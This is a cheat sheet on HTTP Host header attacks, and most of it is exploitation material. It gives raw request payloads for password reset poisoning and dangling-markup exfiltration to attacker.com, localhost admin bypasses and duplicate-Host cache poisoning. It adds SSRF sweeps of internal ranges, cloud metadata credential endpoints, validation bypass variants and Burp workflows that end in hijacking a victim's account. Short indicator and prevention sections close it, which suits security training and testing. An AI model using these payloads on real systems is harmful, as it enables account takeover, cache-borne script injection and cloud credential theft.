# HTTP Host Header Attacks - Cheat Sheet

Quick reference guide for testing and exploiting HTTP Host header vulnerabilities.

## Table of Contents
1. [Quick Testing Methodology](#quick-testing-methodology)
2. [Common Payloads](#common-payloads)
3. [Attack Vectors](#attack-vectors)
4. [Burp Suite Workflows](#burp-suite-workflows)
5. [Bypass Techniques](#bypass-techniques)
6. [Detection Signatures](#detection-signatures)

---

## Quick Testing Methodology

### 1. Initial Discovery (30 seconds)
```http
# Test if Host header can be modified
GET / HTTP/1.1
Host: arbitrary-domain.com

# Test with override headers
GET / HTTP/1.1
Host: legitimate-domain.com
X-Forwarded-Host: arbitrary-domain.com
```

### 2. Identify Reflection Points (1 minute)
```bash
# Check where Host header appears:
- Password reset emails
- Absolute URLs in responses
- JavaScript file imports
- Redirect Location headers
- CORS headers
- Cache keys
```

### 3. Enumerate Endpoints (2 minutes)
```http
# Test critical endpoints
POST /forgot-password
GET /admin
GET /api/*
GET /internal/*
```

### 4. Exploit (Variable)
Based on identified vulnerability type, apply specific payload.

---

## Common Payloads

### Password Reset Poisoning
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

username=victim
```

### Authentication Bypass
```http
GET /admin HTTP/1.1
Host: localhost
```

```http
GET /admin HTTP/1.1
Host: 127.0.0.1
```

### Web Cache Poisoning
```http
# Duplicate Host headers
GET /?cb=123 HTTP/1.1
Host: legitimate-domain.com
Host: attacker.com
```

### Routing-Based SSRF
```http
# Internal IP scanning
GET / HTTP/1.1
Host: 192.168.0.1
```

```http
# Cloud metadata access
GET / HTTP/1.1
Host: 169.254.169.254
```

### Absolute URL SSRF
```http
GET https://legitimate-domain.com/ HTTP/1.1
Host: 192.168.0.1
```

### Connection State Attack
```http
# Request 1 (legitimate)
GET / HTTP/1.1
Host: legitimate-domain.com
Connection: keep-alive

# Request 2 (malicious, same connection)
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
```

### Dangling Markup in Email
```http
POST /forgot-password HTTP/1.1
Host: legitimate-domain.com:'<a href="//attacker.com/?
Content-Type: application/x-www-form-urlencoded

username=victim
```

---

## Attack Vectors

### 1. Password Reset Poisoning

**Indicators:**
- Password reset functionality exists
- Reset emails contain links with tokens
- Host header reflected in email URLs

**Exploitation:**
```http
POST /forgot-password HTTP/1.1
Host: YOUR-EXPLOIT-SERVER.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

username=victim
```

**Check:** Access logs on your server for captured tokens

**Impact:** Account takeover

### 2. Authentication Bypass

**Indicators:**
- Admin panel exists
- Error message mentions "local users"
- IP-based restrictions

**Payloads:**
```http
Host: localhost
Host: 127.0.0.1
Host: 0.0.0.0
Host: [::1]
Host: 127.1
Host: 2130706433 (decimal representation)
```

**Impact:** Unauthorized admin access

### 3. Web Cache Poisoning

**Indicators:**
- Caching headers present (X-Cache, Age, Cache-Control)
- Host header reflected in response
- Script/resource imports use absolute URLs

**Testing:**
```http
# Use cache busters during testing
GET /?cb=random-value HTTP/1.1
Host: legitimate-domain.com
Host: attacker.com
```

**Exploitation:**
1. Create malicious resource on attacker server
2. Poison cache with duplicate Host headers
3. Remove cache buster for production exploitation

**Impact:** Mass XSS, script injection

### 4. Routing-Based SSRF

**Indicators:**
- Load balancer/proxy in use
- Modified Host header still returns responses
- Internal network accessible

**Network Scanning:**
```python
# Burp Intruder payload
Host: 192.168.0.§0§
# Payload type: Numbers (0-255)
```

**Cloud Metadata:**
```http
Host: 169.254.169.254  # AWS, Azure, GCP
Host: metadata.google.internal  # GCP
```

**Impact:** Internal network access, cloud credential theft

### 5. SSRF via Flawed Parsing

**Indicators:**
- Standard Host modification blocked
- Absolute URLs in request line accepted

**Exploitation:**
```http
GET https://legitimate-domain.com/ HTTP/1.1
Host: 192.168.0.1
```

**Impact:** Bypass Host validation, access internal resources

### 6. Connection State Exploitation

**Requirements:**
- Burp Suite 2022.8.1+
- HTTP/1.1 persistent connections

**Technique:**
```http
# Send in sequence on single connection:

# Request 1
GET / HTTP/1.1
Host: legitimate-domain.com
Connection: keep-alive

# Request 2 (same TCP connection)
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
```

**Impact:** Bypass validation on subsequent requests

### 7. Dangling Markup Injection

**Indicators:**
- Passwords sent in email body
- Arbitrary ports accepted in Host header
- Email HTML not fully sanitized

**Payload:**
```http
Host: legitimate.com:'<a href="//attacker.com/?
```

**Result:** Captures content after injection point

**Impact:** Password/token exfiltration from emails

---

## Burp Suite Workflows

### Basic Testing
```
1. Proxy > HTTP History > Find request
2. Right-click > Send to Repeater
3. Modify Host header
4. Analyze response
```

### Password Reset Poisoning
```
1. Request password reset for test account
2. Intercept POST /forgot-password
3. Send to Repeater
4. Change Host to exploit server
5. Send request
6. Check exploit server access logs
7. Extract token and use for victim account
```

### Cache Poisoning
```
1. Identify cacheable endpoint
2. Add cache buster: GET /?cb=123
3. Send to Repeater
4. Add duplicate Host header
5. Create malicious resource on exploit server
6. Send until X-Cache: hit
7. Remove cache buster
8. Repeat to poison production cache
```

### Internal Network Scanning
```
1. Send request to Intruder
2. Position payload: Host: 192.168.0.§0§
3. Payload type: Numbers (0-255, step 1)
4. Start attack
5. Analyze responses for differences
6. Investigate interesting IPs
```

### Connection State Attack
```
1. Send request to Repeater
2. Duplicate tab (Ctrl+D)
3. Select both tabs
4. Right-click > Create tab group
5. Configure Tab 1: legitimate request + keep-alive
6. Configure Tab 2: malicious request + keep-alive
7. Group menu > Send in sequence (single connection)
8. Analyze second response
```

### Collaborator Validation
```
1. Send request to Repeater
2. Burp menu > Burp Collaborator client
3. Copy Collaborator payload
4. Modify Host header to Collaborator domain
5. Send request
6. Poll Collaborator for interactions
7. Confirms SSRF capability
```

---

## Bypass Techniques

### Host Validation Bypasses

**Whitelist Bypass:**
```http
# Append to legitimate domain
Host: legitimate-domain.com.attacker.com

# Use @ symbol
Host: legitimate-domain.com@attacker.com

# Subdomain takeover
Host: vulnerable-subdomain.legitimate-domain.com
```

**Case Manipulation:**
```http
Host: LOCALHOST
Host: LocalHost
Host: localhost
```

**Alternative Representations:**
```http
# IPv4 variations
Host: 127.0.0.1
Host: 127.1
Host: 0x7f.0x0.0x0.0x1 (hex)
Host: 2130706433 (decimal)
Host: 017700000001 (octal)

# IPv6
Host: [::1]
Host: [0:0:0:0:0:0:0:1]
Host: [0000:0000:0000:0000:0000:0000:0000:0001]
```

**Port Manipulation:**
```http
# Omit port
Host: legitimate-domain.com

# Add arbitrary port
Host: legitimate-domain.com:arbitrary

# Use injection in port
Host: legitimate-domain.com:'<injection>
```

### Override Headers

**Common Headers:**
```http
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
X-Host: attacker.com
Forwarded: host=attacker.com
```

**Priority Testing:**
```http
# Test which takes precedence
GET / HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: attacker.com
```

### Ambiguous Requests

**Duplicate Headers:**
```http
GET / HTTP/1.1
Host: legitimate.com
Host: attacker.com
```

**Line Wrapping:**
```http
GET / HTTP/1.1
Host: legitimate.com
 injected-value
```

**Absolute URL:**
```http
GET https://legitimate.com/ HTTP/1.1
Host: attacker.com
```

**Malformed Requests:**
```http
# Missing space
GET / HTTP/1.1
Host:attacker.com

# Multiple colons
Host: legitimate.com:80:injected

# Special characters
Host: legitimate.com\rattacker.com
Host: legitimate.com%0d%0aX-Injected: value
```

---

## Detection Signatures

### Indicators of Vulnerability

**Application-Level:**
- Password reset emails contain host-based URLs
- Admin panels with "local users only" messages
- Absolute URLs in HTML/JavaScript
- Redirect Location headers using Host value
- CORS headers reflecting Host header
- Caching behavior influenced by Host header

**Response Headers:**
```http
# Vulnerable cache configuration
X-Cache: hit
Cache-Control: public, max-age=3600
Vary: Accept-Encoding (Host NOT in Vary)

# Vulnerable redirects
Location: https://{HOST_HEADER}/path

# CORS reflection
Access-Control-Allow-Origin: https://{HOST_HEADER}
```

**Error Messages:**
```
"Admin interface only available to local users"
"Invalid Host header"
"Host not allowed"
"Access restricted to internal network"
```

### Testing Checklist

- [ ] Can Host header be modified without errors?
- [ ] Does application reflect Host header in responses?
- [ ] Are password reset emails affected by Host header?
- [ ] Can localhost/127.0.0.1 bypass restrictions?
- [ ] Are duplicate Host headers accepted?
- [ ] Do override headers (X-Forwarded-Host) work?
- [ ] Can absolute URLs bypass Host validation?
- [ ] Are persistent connections exploitable?
- [ ] Is cache poisoning possible?
- [ ] Can internal IPs be accessed via Host header?
- [ ] Are arbitrary ports accepted?
- [ ] Is email HTML sanitized properly?

### Automated Testing

**Burp Suite Extensions:**
- Param Miner - Discover unkeyed inputs
- Collaborator Everywhere - Automated SSRF detection
- Turbo Intruder - High-speed testing
- Host Header Injection Checker

**Custom Scripts:**
```python
# Host header fuzzing
hosts = [
    'localhost',
    '127.0.0.1',
    'attacker.com',
    '192.168.0.1',
    '169.254.169.254',
]

for host in hosts:
    response = request(url, headers={'Host': host})
    analyze(response)
```

---

## Quick Reference Tables

### Attack Type by Impact

| Attack | Difficulty | Impact | Detection |
|--------|-----------|---------|-----------|
| Password Reset Poisoning | Low | Account Takeover | Email Analysis |
| Authentication Bypass | Low | Unauthorized Access | Access Logs |
| Cache Poisoning | Medium | Mass XSS | Cache Headers |
| Routing SSRF | Medium | Internal Access | Network Logs |
| Flawed Parsing SSRF | Medium | Validation Bypass | Request Logs |
| Connection State | High | Trust Exploitation | Connection Analysis |
| Dangling Markup | High | Data Exfiltration | Email Logs |

### Host Header Priority (Common Configurations)

| Priority | Header | Purpose |
|----------|--------|---------|
| 1 | X-Forwarded-Host | Proxy/CDN override |
| 2 | X-Host | Alternative override |
| 3 | Host | Standard HTTP header |
| 4 | Forwarded | RFC 7239 standard |

### Internal IP Ranges to Test

```
10.0.0.0/8      (10.0.0.0 - 10.255.255.255)
172.16.0.0/12   (172.16.0.0 - 172.31.255.255)
192.168.0.0/16  (192.168.0.0 - 192.168.255.255)
127.0.0.0/8     (127.0.0.1 - 127.255.255.255)
169.254.0.0/16  (Link-local, cloud metadata)
```

### Cloud Metadata Endpoints

```http
# AWS
Host: 169.254.169.254
Path: /latest/meta-data/
Path: /latest/user-data/
Path: /latest/dynamic/instance-identity/

# Azure
Host: 169.254.169.254
Path: /metadata/instance?api-version=2021-02-01
Header: Metadata: true

# Google Cloud
Host: metadata.google.internal
Host: 169.254.169.254
Path: /computeMetadata/v1/
Header: Metadata-Flavor: Google

# DigitalOcean
Host: 169.254.169.254
Path: /metadata/v1/
```

---

## Prevention Checklist

**For Developers:**
- [ ] Never use Host header value directly in URLs
- [ ] Use configuration-based domain values
- [ ] Validate Host header against whitelist
- [ ] Reject ambiguous requests (duplicate headers)
- [ ] Validate on every request, not just connections
- [ ] Disable unnecessary override headers
- [ ] Include Host in cache keys
- [ ] Sanitize all output in emails
- [ ] Use relative URLs where possible
- [ ] Implement proper access controls (not Host-based)

**For Infrastructure:**
- [ ] Configure load balancers to validate Host headers
- [ ] Separate internal and external virtual hosts
- [ ] Implement network segmentation
- [ ] Monitor for suspicious Host header patterns
- [ ] Log all Host header values
- [ ] Reject requests to internal IPs from external sources
- [ ] Implement egress filtering
- [ ] Use TLS with proper certificate validation

---

*Quick reference for identifying and exploiting HTTP Host header vulnerabilities. Always obtain proper authorization before testing.*
